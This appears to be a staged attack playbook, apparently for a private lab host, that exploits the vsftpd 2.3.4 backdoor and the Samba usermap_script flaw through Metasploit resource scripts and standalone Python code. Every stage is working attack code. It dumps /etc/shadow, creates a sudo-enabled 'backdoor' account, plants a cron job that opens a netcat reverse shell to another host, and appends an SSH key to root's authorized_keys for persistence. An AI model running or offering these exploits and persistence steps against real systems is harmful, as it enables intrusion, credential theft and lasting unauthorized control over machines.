stages.description: Exploit vsftpd and verify access in single msfconsole session
commands:
cat > /tmp/vsftpd_full.rc << 'EOF'
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.5
set RPORT 21
exploit -j
sleep 15
sessions -l
sessions -i 1 -c "id"
sessions -i 1 -c "pwd"
sessions -i 1 -c "cat /etc/shadow | head -5"
exit -y
EOF
timeout 60 msfconsole -q -r /tmp/vsftpd_full.rc | tee /tmp/vsftpd_output.txt
grep -q 'uid=0(root)' /tmp/vsftpd_output.txt && echo 'SUCCESS: Got root shell' || echo 'FAILED: No root access'
echo 'Privilege escalation not needed - vsftpd backdoor gives root directly'

stages.description: Add SSH backdoor user via standalone exploit
commands:
cat > /tmp/vsftpd_persist.rc << 'EOF'
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.5
set RPORT 21
exploit -j
sleep 15
sessions -i 1 -c "useradd -m -s /bin/bash backdoor"
sessions -i 1 -c "echo 'backdoor:password123' | chpasswd"
sessions -i 1 -c "usermod -aG sudo backdoor"
sessions -i 1 -c "cat /etc/passwd | grep backdoor"
exit -y
EOF
timeout 60 msfconsole -q -r /tmp/vsftpd_persist.rc | tee /tmp/persist_output.txt
sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa,ssh-dss backdoor@192.168.56.5 'whoami' || echo 'SSH persistence failed'
stages.verification: SSH login as backdoor user succeeds

commands:
cat > /tmp/samba_full.rc << 'EOF'
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.5
set RPORT 139
set PAYLOAD cmd/unix/reverse
set LPORT 4444
exploit -j
sleep 15
sessions -l
sessions -i 1 -c "id"
sessions -i 1 -c "uname -a"
exit -y
EOF
timeout 60 msfconsole -q -r /tmp/samba_full.rc | tee /tmp/samba_output.txt
grep -q 'uid=' /tmp/samba_output.txt && echo 'SUCCESS: Got shell' || echo 'FAILED: No shell'
stages.verification: Check for shell access in output

commands:
cat > /tmp/samba_priv.rc << 'EOF'
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.5
set RPORT 139
set PAYLOAD cmd/unix/reverse
set LPORT 4445
exploit -j
sleep 15
sessions -i 1 -c "id"
sessions -i 1 -c "sudo -l"
sessions -i 1 -c "find / -perm -4000 2>/dev/null | head -10"
exit -y
EOF
timeout 60 msfconsole -q -r /tmp/samba_priv.rc | tee /tmp/samba_priv_output.txt

cat > /tmp/samba_persist.rc << 'EOF'
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.5
set RPORT 139  
set PAYLOAD cmd/unix/reverse
set LPORT 4446
exploit -j
sleep 15
sessions -i 1 -c "echo '*/5 * * * * nc 192.168.56.2 4447 -e /bin/bash' | crontab -"
sessions -i 1 -c "crontab -l"
exit -y
EOF
timeout 60 msfconsole -q -r /tmp/samba_persist.rc | tee /tmp/samba_persist_output.txt

stages.description: Use Python to trigger vsftpd backdoor directly
commands:
cat > /tmp/vsftpd_exploit.py << 'EOF'
import socket
import time

def exploit():
    # Connect to FTP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.56.5', 21))
    s.recv(1024)
    
    # Trigger backdoor with :) in username
    s.send(b'USER root:)\r\n')
    s.recv(1024)
    s.send(b'PASS password\r\n')
    s.close()
    
    time.sleep(2)
    
    # Connect to backdoor shell on port 6200
    shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell.connect(('192.168.56.5', 6200))
    
    # Send command
    shell.send(b'id\n')
    result = shell.recv(4096).decode()
    print(result)
    
    shell.send(b'whoami\n')
    result = shell.recv(4096).decode()
    print(result)
    
    shell.close()
    return result

if __name__ == '__main__':
    try:
        exploit()
        print('SUCCESS')
    except Exception as e:
        print(f'FAILED: {e}')
EOF
python3 /tmp/vsftpd_exploit.py
echo 'N/A - backdoor provides root'

stages.description: Use shell to add SSH key
commands: test -f ~/.ssh/id_rsa || ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa

cat > /tmp/add_key.py << 'EOF'
import socket
import time

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.56.5', 21))
    s.recv(1024)
    s.send(b'USER root:)\r\n')
    s.recv(1024)
    s.send(b'PASS pass\r\n')
    s.close()
    time.sleep(2)
    
    shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell.connect(('192.168.56.5', 6200))
    
    with open('/home/kali/.ssh/id_rsa.pub', 'r') as f:
        pubkey = f.read().strip()
    
    commands = [
        'mkdir -p /root/.ssh',
        'chmod 700 /root/.ssh',
        f'echo "{pubkey}" >> /root/.ssh/authorized_keys',
        'chmod 600 /root/.ssh/authorized_keys',
        'cat /root/.ssh/authorized_keys'
    ]
    
    for cmd in commands:
        shell.send(f'{cmd}\n'.encode())
        time.sleep(1)
        result = shell.recv(4096)
        print(result.decode())
    
    shell.close()

exploit()
EOF
python3 /tmp/add_key.py
ssh -o StrictHostKeyChecking=no -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -i ~/.ssh/id_rsa root@192.168.56.5 'whoami'
stages.verification: SSH with key succeeds and returns 'root'
